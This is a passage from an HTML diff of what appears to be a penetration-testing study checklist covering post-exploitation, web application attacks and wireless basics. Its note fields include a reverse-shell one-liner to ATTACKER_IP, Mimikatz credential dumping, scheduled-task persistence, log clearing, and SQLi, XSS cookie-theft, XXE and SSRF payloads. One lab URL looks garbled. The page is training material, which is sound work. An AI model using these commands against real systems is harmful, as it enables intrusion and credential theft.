+                                     <div><i class="fa-solid fa-terminal"></i> <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener noreferrer">Reverse Shell Cheatsheet</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Applied concept during exploitation</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m3-item7-note" placeholder="Reverse shells bypass firewalls better. Staged payloads are smaller, may get caught by AV. Stageless are larger. Meterpreter is feature-rich (post-ex modules). Use `nc -lvnp <port>` to listen for reverse shells."></textarea></div>
+                             </div>
+                         </li>
+                     </ul>
+                 </div>
+            </section>
+
+            <!-- Module 4 -->
+            <section class="module" data-module-id="module-4">
+                 <div class="module-header"><h3>Module 4: Post-Exploitation</h3><div class="module-stats"><span class="progress-text">0 / 8</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item0"><span class="item-title">Meterpreter Basics & Shell Interaction</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Essential Meterpreter commands: `sysinfo`, `getuid`, `getsystem`, `ps`, `migrate`, `upload`, `download`, `execute`, `shell` (drop to OS shell), `pwd`, `cd`, `ls`. Shell stabilization (`python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'`, `stty raw -echo; fg`).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" target="_blank" rel="noopener noreferrer">Meterpreter Basics (OffSec)</a></div>
+                                     <div><i class="fa-solid fa-terminal"></i> <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener noreferrer">Shell Upgrade Techniques</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Practice after getting shell access</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item0-note" placeholder="`migrate <pid>` to move into stable process. `upload local_file /tmp/remote_file`. `download /etc/passwd .`. `execute -f cmd.exe -i`. Stabilize shell for better interaction (use `Ctrl+Z`, `stty raw -echo; fg`)."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item1"><span class="item-title">Internal Information Gathering (Enumeration)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify user (`whoami`, `id`), hostname, OS version, network configuration (`ipconfig`/`ip addr`, `netstat -ano`/`ss -tulpn`), running processes/services, scheduled tasks, installed software, user home directories, interesting files (config, passwords).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc Enum</a></div>
+                                      <div><i class="fa-solid fa-book"></i> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Windows PrivEsc Enum</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Manual checks after initial access</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item1-note" placeholder="Linux: `uname -a`, `cat /etc/os-release`, `ps aux`, `find / -perm -4000 2>/dev/null`. Windows: `systeminfo`, `net user`, `net localgroup administrators`, `schtasks`, `wmic product get name,version`."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item2"><span class="item-title">Windows Privilege Escalation Vectors</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify common paths: Kernel exploits (less common now), misconfigured services (unquoted paths, weak permissions), weak registry permissions, always-install-elevated GPO, stored credentials (SAM, LSA secrets - Mimikatz), DLL hijacking, insecure file permissions, UAC bypass techniques.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-arrow-up-from-bracket"></i> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Win PrivEsc</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener noreferrer">WinPEAS Script</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/windows राजेशection" target="_blank" rel="noopener noreferrer">THM: Windows PrivEsc</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item2-note" placeholder="Check service perms: `accesschk.exe -uwcqv &quot;SERVICE NAME&quot;`. Unquoted paths: `wmic service get name,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;`. Mimikatz: `privilege::debug`, `sekurlsa::logonpasswords`."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item3"><span class="item-title">Linux Privilege Escalation Vectors</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify common paths: Kernel exploits (check `uname -a`), SUID/GUID binaries (GTFOBins), `sudo -l` misconfigurations (NOPASSWD, env_keep), cron jobs (writable scripts/paths), weak file permissions (`/etc/passwd`, `/etc/shadow`, web roots), NFS `no_root_squash`, Docker group membership.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-arrow-up-from-bracket"></i> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Linux PrivEsc</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linpeas" target="_blank" rel="noopener noreferrer">LinPEAS Script</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener noreferrer">THM: Linux PrivEsc</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item3-note" placeholder="SUID: `find / -perm -u=s -type f 2>/dev/null`. Check GTFOBins for binary. `sudo -l`. Check cron: `cat /etc/crontab`, files in `/etc/cron.*`. Writable files: `find / -writable 2>/dev/null`. Check `/etc/exports` for NFS."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item4"><span class="item-title">Using Automated PrivEsc Check Scripts</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Download and run scripts like LinPEAS, WinPEAS, Linux-Exploit-Suggester, LES (Linux Exploit Suggester 2), PowerUp to quickly identify common privilege escalation vectors based on system configuration.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener noreferrer">PEASS-ng Suite (Lin/WinPEAS)</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener noreferrer">Linux Exploit Suggester</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Use during CTFs/Labs</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item4-note" placeholder="Upload script (Meterpreter `upload`, web server `wget`/`curl`, `certutil`). Run: `chmod +x linpeas.sh; ./linpeas.sh`. Windows: `powershell -ep bypass -f winPEAS.ps1`. Don't rely solely on scripts; understand the underlying checks."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item5"><span class="item-title">Maintaining Access / Persistence Concepts</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand techniques to regain access after reboot or disconnect: Scheduled tasks (Windows), cron jobs (Linux), new services, Run keys (Registry), startup folders, web shells, SSH key injection, creating new users.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-anchor"></i> <a href="https://attack.mitre.org/tactics/TA0003/" target="_blank" rel="noopener noreferrer">MITRE ATT&CK - Persistence</a></div>
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/persistence" target="_blank" rel="noopener noreferrer">HackTricks Win Persistence</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/windowsprivesc" target="_blank" rel="noopener noreferrer">THM: Windows PrivEsc (includes persistence)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item5-note" placeholder="Win: `schtasks /create /tn &quot;Update&quot; /tr &quot;C:\payload.exe&quot; /sc ONLOGON /RU SYSTEM`. Linux: Add line to `/etc/crontab`. Meterpreter: `run persistence -h` (often detected). Web shell: Upload simple PHP/ASPX shell."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item6"><span class="item-title">Pivoting & Lateral Movement Concepts</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand using a compromised host to access other internal systems not directly reachable from attacker machine. Techniques: Port forwarding (Meterpreter `portfwd`, `ssh -L`), dynamic proxies (SOCKS proxy with `proxychains`, `ssh -D`), relaying attacks (Responder, NTLMRelayX).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-diagram-project"></i> <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank" rel="noopener noreferrer">MITRE ATT&CK - Lateral Movement</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/haad/proxychains-ng" target="_blank" rel="noopener noreferrer">proxychains-ng</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/lateralmovementandpivoting" target="_blank" rel="noopener noreferrer">THM: Lateral Movement & Pivoting</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item6-note" placeholder="Meterpreter: `portfwd add -l 8080 -p 80 -r internal_web_ip`. Configure `proxychains.conf`. `proxychains nmap internal_ip_range`. Goal: Find more targets, escalate domain privileges."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m4-item7"><span class="item-title">Covering Tracks (Basic Concepts & Risks)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand common log locations (Linux: `/var/log/auth.log`, `.bash_history`; Windows: Event Viewer logs). Basic clearing techniques (`history -c`, Meterpreter `clearev`). Emphasize difficulty, risks, and forensic implications (often detectable).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-eraser"></i> <a href="https://attack.mitre.org/techniques/T1070/" target="_blank" rel="noopener noreferrer">MITRE ATT&CK - Indicator Removal</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Conceptual / Be cautious in real tests</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m4-item7-note" placeholder="Generally discouraged in professional pentests unless explicitly permitted. Focus on stealth during exploitation rather than noisy cleanup. Centralized logging makes clearing local logs less effective. Meterpreter `clearev` is noisy."></textarea></div>
+                             </div>
+                         </li>
+                     </ul>
+                 </div>
+            </section>
+
+            <!-- Module 5 -->
+            <section class="module" data-module-id="module-5">
+                 <div class="module-header"><h3>Module 5: Web Application Security</h3><div class="module-stats"><span class="progress-text">0 / 13</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item0"><span class="item-title">HTTP/HTTPS Protocol Deep Dive</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand HTTP request/response structure: Methods (GET, POST, PUT, DELETE, etc.), URLs, headers (Host, User-Agent, Content-Type, Cookie, Authorization), status codes (2xx, 3xx, 4xx, 5xx), cookies, sessions, basics of HTTPS (TLS/SSL).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview" target="_blank" rel="noopener noreferrer">MDN HTTP Overview</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/httpindetail" target="_blank" rel="noopener noreferrer">THM: HTTP in Detail</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item0-note" placeholder="Use Browser DevTools (Network Tab) or Burp Suite to inspect traffic. Understand key headers. POST sends data in body, GET uses URL params. 403=Forbidden, 404=Not Found, 500=Server Error."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item1"><span class="item-title">Introduction to OWASP Top 10</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Familiarize with the current OWASP Top 10 list of most critical web application security risks (e.g., Injection, Broken Access Control, Cryptographic Failures, etc.). Understand the concepts behind each category.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-shield-halved"></i> <a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10 Project</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/owasptop10" target="_blank" rel="noopener noreferrer">THM: OWASP Top 10</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item1-note" placeholder="Memorize the main categories. This provides a framework for web pentesting. We'll cover specific items next."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item2"><span class="item-title">Injection Flaws: SQL Injection (SQLi)</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Exploit vulnerable SQL queries. Types: Error-based, Union-based, Boolean-based Blind, Time-based Blind. Manual testing techniques (`' OR 1=1 -- `). Automated tool: `sqlmap`.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-database"></i> <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener noreferrer">OWASP SQL Injection</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://sqlmap.org/" target="_blank" rel="noopener noreferrer">sqlmap</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/sqlinjectionlm" target="_blank" rel="noopener noreferrer">THM: SQL Injection</a> / PortSwigger Labs</div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item2-note" placeholder="Identify injection points (URL params, POST data, headers). Test with `'`. Union: `id=1' UNION SELECT null, version(), database() -- -`. Tool: `sqlmap -u &quot;http://target.com/vuln?id=1&quot; --dbs --batch`."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item3"><span class="item-title">Injection Flaws: Command Injection</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Inject OS commands into vulnerable input fields that are passed to system shell functions. Use shell metacharacters like `;`, `|`, `&&`, `$(...)`, `` ` ``.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-terminal"></i> <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank" rel="noopener noreferrer">OWASP Command Injection</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener noreferrer">PortSwigger OS Command Injection</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item3-note" placeholder="Test input fields (e.g., ping utility). Try `127.0.0.1 ; whoami`, `127.0.0.1 | id`, `$(ls /)`. Look for output or use time delays (`sleep 10`). Get reverse shell: `... ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`"></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item4"><span class="item-title">Broken Authentication</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Weaknesses in login, session management: weak password policies, credential stuffing, session fixation, predictable session IDs, improper logout.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-user-lock"></i> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="_blank" rel="noopener noreferrer">OWASP Broken Auth (A07:2021)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/authentication" target="_blank" rel="noopener noreferrer">PortSwigger Authentication Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item4-note" placeholder="Test password reset functionality. Check session cookie entropy/expiration. Try reusing session IDs. Use Hydra for brute-force/stuffing."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item5"><span class="item-title">Sensitive Data Exposure (Cryptographic Failures)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Failure to properly protect sensitive data (passwords, PII, credit cards) both in transit (lack of TLS) and at rest (weak hashing, no encryption, clear text storage). Exposed API keys in source code.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-key"></i> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" target="_blank" rel="noopener noreferrer">OWASP Cryptographic Failures (A02:2021)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Check during web enumeration/analysis</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item5-note" placeholder="Check for HTTPS everywhere. Analyze stored passwords (are they hashed? salted? easily crackable?). Search JS files/source code for API keys/secrets. Check API responses for excessive data."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item6"><span class="item-title">XML External Entities (XXE)</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Exploit weakly configured XML parsers by injecting external entities in XML input to read local files (`file:///etc/passwd`), perform Server-Side Request Forgery (SSRF), or cause Denial of Service.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-code"></i> <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener noreferrer">OWASP XXE</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener noreferrer">PortSwigger XXE Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item6-note" placeholder="Look for XML data inputs (e.g., file uploads, API requests). Inject DTD: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;> ]>`. Reference entity in XML: `<data>&xxe;</data>`. Use parameter entities for out-of-band data exfiltration."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item7"><span class="item-title">Broken Access Control</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Bypassing authorization checks: Insecure Direct Object References (IDOR - changing IDs in URL/params), path traversal (`../../`), privilege escalation (accessing admin functions as user), forced browsing to restricted areas.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-lock-open"></i> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank" rel="noopener noreferrer">OWASP Broken Access Control (A01:2021)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/access-control" target="_blank" rel="noopener noreferrer">PortSwigger Access Control Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item7-note" placeholder="IDOR: Change `/user/123/profile` to `/user/124/profile`. Path Trav: `/download?file=../../../etc/passwd`. Try accessing `/admin` pages directly. Check roles/permissions changes."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item8"><span class="item-title">Security Misconfiguration</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Insecure default configurations, verbose error messages revealing stack traces or internal paths, unnecessary features/services enabled (e.g., DEBUG mode), missing security headers (CSP, HSTS), default credentials.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-gears"></i> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" target="_blank" rel="noopener noreferrer">OWASP Security Misconfiguration (A05:2021)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Check during web enumeration/testing</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item8-note" placeholder="Check HTTP headers (`curl -I`). Look for server banners. Trigger errors to see verbosity. Check for default admin paths (`/phpmyadmin`, `/wp-admin`). Google default creds for identified tech."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item9"><span class="item-title">Cross-Site Scripting (XSS)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Injecting malicious client-side scripts (JavaScript) into web pages viewed by other users. Types: Reflected (in URL/request), Stored (in database, e.g., comments), DOM-based (manipulating DOM via JS).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-brands fa-js"></i> <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener noreferrer">OWASP XSS</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer">PortSwigger XSS Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item9-note" placeholder="Test input fields. Basic payload: `<script>alert(1)</script>`. Others: `<img src=x onerror=alert(document.cookie)>`. Stored XSS is higher impact. DOM XSS requires analyzing client-side JS."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item10"><span class="item-title">Insecure Deserialization</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Exploiting applications that deserialize user-supplied serialized objects without proper validation, potentially leading to Remote Code Execution (RCE). Affects Java, PHP, .NET, Python apps.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-cubes"></i> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" target="_blank" rel="noopener noreferrer">OWASP A08:2021 (Includes this)</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreferrer">ysoserial (Java payloads)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener noreferrer">PortSwigger Deserialization Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item10-note" placeholder="Look for Base64 encoded data in cookies, parameters, or POST bodies (often starts with `rO0` for Java). Use tools like ysoserial to generate exploit payloads for specific libraries (e.g., Apache Commons Collections)."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item11"><span class="item-title">Using Web Proxies (Burp Suite / OWASP ZAP)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Configure browser to proxy traffic through Burp/ZAP. Intercept, inspect, modify, and repeat HTTP requests. Use key modules: Target (Site map), Proxy (History, Intercept), Repeater, Intruder (brute-forcing/fuzzing), Decoder.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://portswigger.net/burp" target="_blank" rel="noopener noreferrer">Burp Suite</a> / <a href="https://www.zaproxy.org/" target="_blank" rel="noopener noreferrer">OWASP ZAP</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/burpsuitebasics" target="_blank" rel="noopener noreferrer">THM: Burp Suite Basics</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item11-note" placeholder="Setup proxy listener (127.0.0.1:8080). Configure browser proxy settings (FoxyProxy). Install CA certificate in browser. Use Repeater to manually test parameters. Use Intruder for fuzzing/brute force (e.g., password spraying, IDOR checks)."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m5-item12"><span class="item-title">Server-Side Request Forgery (SSRF)</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Trick the server-side application into making HTTP requests to an arbitrary domain chosen by the attacker. Can be used to scan internal networks, access internal services, or interact with cloud metadata APIs (e.g., AWS IMDS).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-server"></i> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/" target="_blank" rel="noopener noreferrer">OWASP SSRF (A10:2021)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer">PortSwigger SSRF Labs</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m5-item12-note" placeholder="Look for parameters taking full URLs (`?url=`, `?image_url=`). Try internal IPs (`http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/` for AWS). Use different protocols (`file:///`, `gopher://`). Bypass filters (`127.0.0.1` -> `localhost`, use different encodings)."></textarea></div>
+                             </div>
+                         </li>
+                     </ul>
+                 </div>
+            </section>
+
+            <!-- Module 6 -->
+            <section class="module" data-module-id="module-6">
+                 <div class="module-header"><h3>Module 6: Wireless Network Security</h3><div class="module-stats"><span class="progress-text">0 / 6</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item0"><span class="item-title">Wireless Networking Basics (802.11)</span></label><span class="difficulty-tag difficulty-beginner">Beginner</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand 802.11 standards (a/b/g/n/ac/ax), frequencies (2.4GHz, 5GHz), channels, SSIDs (network name), BSSIDs (AP MAC address), Stations (client MAC address).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-wifi"></i> <a href="https://www.cisco.com/c/en/us/products/wireless/what-is-802-11.html" target="_blank" rel="noopener noreferrer">Cisco 802.11 Overview</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/wifihacking101" target="_blank" rel="noopener noreferrer">THM: Wifi Hacking 101</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item0-note" placeholder="SSID = Human readable name. BSSID = AP's MAC. Station = Client's MAC. Channels overlap in 2.4GHz (use 1, 6, 11). 5GHz has more non-overlapping channels."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item1"><span class="item-title">Wireless Security Protocols & Weaknesses</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">WEP (Broken - RC4 flaws), WPA (TKIP - vulnerable), WPA2 (CCMP/AES - handshake capture possible for PSK), WPA3 (SAE - more resistant to offline cracking). Understand PSK (Pre-Shared Key) vs Enterprise (RADIUS/802.1X).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-lock"></i> <a href="https://www.cloudflare.com/learning/access-management/what-is-wpa3/" target="_blank" rel="noopener noreferrer">Cloudflare WPA3 Overview</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Covered in Wifi hacking rooms</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item1-note" placeholder="WEP is easily cracked. WPA/WPA2-PSK relies on strong password, vulnerable to offline dictionary attacks via handshake. WPA/WPA2-Enterprise needs RADIUS creds. WPA3 is current standard."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item2"><span class="item-title">Setting up Wireless Adapter for Monitor Mode</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Identify wireless adapter chipset (`lsusb`, `lspci`). Check compatibility (Atheros, Ralink, Realtek often work). Use `airmon-ng` to check/start monitor mode. Ensure drivers are installed.</p>
+                                 <div class="item-links">
